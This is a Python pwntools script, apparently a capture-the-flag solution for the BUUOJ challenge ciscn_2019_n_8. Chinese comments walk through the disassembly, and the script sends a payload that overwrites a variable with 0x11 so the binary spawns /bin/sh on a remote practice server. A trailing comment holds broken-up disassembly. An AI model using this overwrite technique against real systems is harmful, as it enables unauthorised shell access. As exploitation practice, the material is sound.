from pwn import *

'''
关键逻辑片段:
    需要使.text:000012EF成功跳转至.text:0000131E,但.text:00001331不能跳转
    观察10、12两段汇编代码片段可知，12只多了xor  eax, 11h，因此需要确保eax异或后得到的值为0，即可攻破
    因此: 只需要
            eax = 0x00000011
            edx = 0x00000000
          即可成功拿到shell权限


10: if ( *(_QWORD *)&var[13] )
    .text:000012DC 83 C4 10                      add     esp, 10h
    .text:000012DF 8D 83 60 00 00 00             lea     eax, (var - 4000h)[ebx]
    .text:000012E5 8B 50 38                      mov     edx, [eax+38h]
    .text:000012E8 8B 40 34                      mov     eax, [eax+34h]
    .text:000012EB 09 D0                         or      eax, edx
    .text:000012ED 85 C0                         test    eax, eax
    .text:000012EF 75 2D                         jnz     short loc_131E
    
12: if ( *(_QWORD *)&var[13] == 17LL )
    .text:0000131E
    .text:0000131E                               loc_131E:                               ; CODE XREF: main+7C↑j
    .text:0000131E 8D 83 60 00 00 00             lea     eax, (var - 4000h)[ebx]
    .text:00001324 8B 50 38                      mov     edx, [eax+38h]
    .text:00001327 8B 40 34                      mov     eax, [eax+34h]
    .text:0000132A 83 F0 11                      xor     eax, 11h
    .text:0000132D 09 D0                         or      eax, edx
    .text:0000132F 85 C0                         test    eax, eax
    .text:00001331 75 14                         jnz     short loc_1347
    
    system("/bin/sh");
'''


def ciscn_2019_n_8(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_n_8'):
    context(log_level='debug', arch='i386', os='linux')
    print('ciscn_2019_n_8 start')
    target = process([file_name])
    target = remote('node4.buuoj.cn', 29931)

    payload = (p32(0x11111111) * 13 + p32(0x11))

    # gdb.attach(target, 'b &var')
    target.recvuntil("What's your name?")
    target.sendline(payload)

    target.interactive()
    print('ciscn_2019_n_8 end')


if __name__ == '__main__':
    ciscn_2019_n_8()
'''

.text: 565
DF2DF
lea
eax, (var - 565E2000h)[ebx]
.text: 565
DF2E5
mov
edx, [eax + 38h]
.text: 565
DF2E8
mov
eax, [eax + 34h]
.text: 565
DF2EB or eax, edx
.text: 565
DF2ED
test
eax, eax
.text: 565
DF2EF
jnz
short
loc_565DF31E

.text: 565
DF31E
lea
eax, (var - 565E2000h)[ebx]
.text: 565
DF324
mov
edx, [eax + 38h]
.text: 565
DF327
mov
eax, [eax + 34h]
.text: 565
DF32A
xor
eax, 11
h
.text: 565
DF32D or eax, edx
.text: 565
DF32F
test
eax, eax
.text: 565
DF331
jnz
short
loc_565DF347
'''
